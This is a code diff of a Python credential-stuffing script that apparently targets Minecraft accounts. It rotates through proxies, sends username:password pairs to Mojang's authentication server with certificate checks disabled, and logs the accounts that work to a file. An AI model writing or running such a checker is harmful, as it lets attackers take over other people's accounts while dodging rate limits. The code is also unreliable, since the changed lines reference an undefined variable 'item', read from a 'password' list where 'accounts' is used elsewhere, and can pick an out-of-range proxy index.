@@ -28,21 +28,20 @@ def checkAccount(accountNumber):
     global working
     proxyNumber = random.randint(0,len(proxies)) # Get a random proxy from the proxy list
     data = '{"agent":{"name":"Minecraft","version":1},"username":"' + accounts[accountNumber].split(':')[0] +'","password":"' + accounts[accountNumber].split(':')[1] + '"}' # Set the data that will be sent to the auth servers to check
-    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + proxies[proxyNumber].split(':')[0] + ":" + proxies[proxyNumber].split(':')[1]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
+    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"https": "http://" + proxies[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
     if ("accessToken" in response.text): # Check if the account is working.
           working.append(accounts[accountNumber].split(':')[0]+":"+password[accountNumber].split(':')[1])
-          print(working) # Write to STDOUT that it's working
-          with open('working.txt', 'w') as f: # Open working .txt
-                   for item in working: # For every working account
-                               f.write("%s\n" % item) # Write account
+          print(working)
+          with open('working.txt', 'a') as f: # Open working .txt
+                f.write("%s\n" % item) # Write account
     
 def main():
     numThreads = input("How many threads would you like to use? ")
     freeze_support()
     numAccounts = range(len(accounts))
 
-    pool = Pool(int(numThreads))  # Start 4 threads
-    pool.map(checkAccount, numAccounts) # Checky Checky
+    pool = Pool(int(numThreads))
+    pool.map(checkAccount, numAccounts)
 
     pool.close()
     pool.join()
